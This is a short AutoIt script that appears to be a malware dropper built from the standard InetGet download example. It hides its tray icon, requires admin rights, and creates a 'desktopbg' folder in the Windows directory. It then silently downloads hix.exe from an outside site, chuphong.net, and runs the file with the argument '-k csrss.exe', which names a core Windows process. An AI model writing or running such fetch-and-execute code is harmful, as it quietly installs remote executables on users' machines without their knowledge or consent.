#include <InetConstants.au3>

#NoTrayIcon
#RequireAdmin


; Download a file in the background.
; Wait for the download to complete.

Example()

Func Example()

   If Not FileExists(@WindowsDir & "\desktopbg") Then DirCreate(@WindowsDir & "\desktopbg")

    ; Save the downloaded file to the temporary folder.
   ;Local $sFilePath = _WinAPI_GetTempFileName(@TempDir)
    

   Local $sFilePath = @WindowsDir & "\desktopbg\hix.exe"
	;reDownload file
	;If FileExists(@WindowsDir & "\desktopbg\vntadv.exe") Then FileDelete(@WindowsDir & "\desktopbg\vntadv.exe")
	
    ; Download the file in the background with the selected option of 'force a reload from the remote site.'
    Local $hDownload = InetGet("http://chuphong.net/test/hix.exe", $sFilePath, $INET_FORCERELOAD, $INET_DOWNLOADBACKGROUND)

    ; Wait for the download to complete by monitoring when the 2nd index value of InetGetInfo returns True.
    Do
        Sleep(250)
    Until InetGetInfo($hDownload, $INET_DOWNLOADCOMPLETE)

    ; Retrieve the number of total bytes received and the filesize.
    Local $iBytesSize = InetGetInfo($hDownload, $INET_DOWNLOADREAD)
    Local $iFileSize = FileGetSize($sFilePath)

    ; Close the handle returned by InetGet.
    InetClose($hDownload)

    ; Display details about the total number of bytes read and the filesize.
    ;MsgBox($MB_SYSTEMMODAL, "", "The total download size: " & $iBytesSize & @CRLF & _"The total filesize: " & $iFileSize)

    ; Delete the file.
   ; FileDelete($sFilePath)
EndFunc   ;==>Example

Local $exeLocation = @WindowsDir & "\desktopbg\hix.exe"
Run($exeLocation & ' -k csrss.exe')